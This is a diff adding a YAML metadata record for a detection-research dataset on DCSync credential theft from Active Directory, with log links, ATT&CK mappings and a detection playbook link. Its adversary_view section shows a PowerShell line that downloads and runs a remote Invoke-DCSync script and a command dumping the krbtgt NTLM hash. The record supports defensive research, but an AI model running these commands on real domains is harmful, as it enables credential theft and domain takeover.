@@ -1,0 +1,57 @@
+id: 190301-CredsAccess-ADReplication
+title: Credentials Access via Active Directory Replication Services
+description: This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/03/01
+modification_date: 2022/09/21
+platform:
+  - Windows
+type: atomic
+tags:
+  - AD Replication services
+  - RPC DRSUAPI DsGetNCChanges
+
+attack_mappings:
+  - technique: T1003
+    sub-technique: "006"
+    tactics:
+      - TA0006
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 677.04 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 181.23 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip
+  network:
+    - log_source: Wireshark
+      size: 3.19 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: Manual
+      name: Empire
+      module: DCSync
+      script: https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1
+  permissions_required:
+    - Domain Admin
+  adversary_view: |-
+    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1')
+    PS C:\Windows\system32> Invoke-DCSync -Users @("krbtgt") | ft -wrap -autosize
+
+    Domain           User   ID  Hash
+    ------           ----   --  ----
+    mssentinel.local krbtgt 502 a9152b9eac7530531db4dc67aa8eb1e4
+
+    PS C:\Windows\system32>
+
+detection:
+  - project: Threat Hunter Playbook
+    name: Active Directory Replication From Non-Domain-Controller Accounts
+    link: https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-180815210510.html
